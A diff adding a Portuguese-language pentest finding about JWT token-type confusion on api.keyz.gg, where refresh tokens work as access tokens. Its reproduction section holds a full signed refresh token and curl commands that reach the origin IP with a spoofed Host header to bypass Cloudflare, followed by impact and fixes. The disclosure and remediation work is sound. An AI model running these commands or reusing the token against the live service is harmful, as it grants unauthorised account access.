@@ -1,0 +1,88 @@
+# F-W1 — JWT Token Type Confusion (refresh token usable as access token)
+
+## Severidade: Alta
+
+## Host
+api.keyz.gg (via bypass Cloudflare: https://104.238.205.118/ + Host: api.keyz.gg)
+
+## Data
+2026-09-05T00:05Z
+
+## Descrição
+O servidor NestJS aceita o **refresh token** como se fosse um **access token**
+em TODOS os endpoints autenticados regulares. Ambos os tokens são assinados
+com o MESMO secret HS256 e o servidor NÃO valida o "tipo" do token (access vs
+refresh). O refresh token tem expiração de **7 dias** (vs 1h do access token)
+e NÃO contém o claim `email` (apenas `sub`), mas ainda é aceito.
+
+## Reprodução
+
+### Estrutura dos tokens
+
+Access token (exp 1h):
+```json
+{"email":"test@test.com","sub":270,"iat":1788565822,"exp":1788569422,
+ "aud":"https://keyz.gg/","iss":"https://api.keyz.gg/"}
+```
+
+Refresh token (exp 7 dias):
+```json
+{"sub":270,"iat":1788565097,"exp":1789169897,
+ "aud":"https://keyz.gg/","iss":"https://api.keyz.gg/"}
+```
+Nota: refresh token NÃO tem claim `email`, mas tem `sub`.
+
+### Comandos (via bypass Cloudflare)
+
+```bash
+REF="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjI3MCwiaWF0IjoxNzg4NTY1MDk3LCJleHAiOjE3ODkxNjk4OTcsImF1ZCI6Imh0dHBzOi8va2V5ei5nZy8iLCJpc3MiOiJodHRwczovL2FwaS5rZXl6LmdnLyJ9.1ST4BK6V6CSPkz-aOAmJcepisCJZE8K7J2Af9tmv51k"
+
+# /me com refresh token (deveria rejeitar, mas ACEITA)
+curl -k -H "Host: api.keyz.gg" -H "Authorization: Bearer $REF" \
+  https://104.238.205.118/me
+# 200 OK — retorna dados do user 270
+
+# /tickets com refresh token
+curl -k -H "Host: api.keyz.gg" -H "Authorization: Bearer $REF" \
+  https://104.238.205.118/tickets
+# 200 OK — {"tickets":[],"total":0}
+
+# /wishlist com refresh token
+curl -k -H "Host: api.keyz.gg" -H "Authorization: Bearer $REF" \
+  https://104.238.205.118/wishlist
+# 200 OK — {"items":[],"total":0}
+
+# /users/recent-transactions com refresh token
+curl -k -H "Host: api.keyz.gg" -H "Authorization: Bearer $REF" \
+  https://104.238.205.118/users/recent-transactions
+# 200 OK — {"transactions":[]}
+```
+
+### Contraste: Admin API usa secret diferente
+
+```bash
+# /adm/me com refresh token regular → 401 "Invalid authorization: invalid signature"
+curl -k -H "Host: api.keyz.gg" -H "Authorization: Bearer $REF" \
+  https://104.238.205.118/adm/me
+# 401 — {"message":"Invalid authorization: invalid signature."}
+```
+
+## Output
+
+Todas as chamadas com refresh token retornaram **200 OK** com dados do
+usuário (sub:270). A admin API (/adm/me) rejeitou com "invalid signature",
+confirmando que admin e regular usam secrets DIFERENTES.
+
+## Impacto
+- Um atacante que capture um refresh token (via XSS, MITM, log leak) ganha
+  acesso à API por **7 dias** (vs 1h do access token).
+- O refresh token pode ser usado diretamente sem chamar /auth/refresh.
+- Estende significativamente a janela de acesso pós-comprometimento.
+- Como o refresh token não tem claim `email`, qualquer lógica baseada em
+  `req.user.email` pode falhar (comportamento indefinido → possíveis bugs).
+
+## Recomendação
+1. Validar o tipo do token (access vs refresh) no middleware de auth.
+2. Usar claims distintos (e.g. `type: "access"` vs `type: "refresh"`).
+3. Usar secrets ou algoritmos diferentes para access e refresh tokens.
+4. Rejeitar refresh tokens em endpoints de acesso.
